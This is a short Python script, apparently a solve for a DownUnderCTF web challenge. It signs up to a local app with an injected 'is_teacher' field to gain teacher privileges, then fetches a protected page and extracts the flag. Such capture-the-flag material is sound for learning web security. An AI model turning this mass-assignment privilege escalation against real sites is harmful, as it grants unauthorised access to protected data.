from requests import Session
import re

BASE_URL = 'http://localhost:5000'
sess = Session()
sess.post(f'{BASE_URL}/signup', data={'stu_num': 'x', 'stu_email': 'x', 'password': 'x', 'is_teacher': '1'})
r = sess.get(f'{BASE_URL}/grades_flag')
flag = re.findall(r'DUCTF{.*}', r.text)[0]
print(flag)
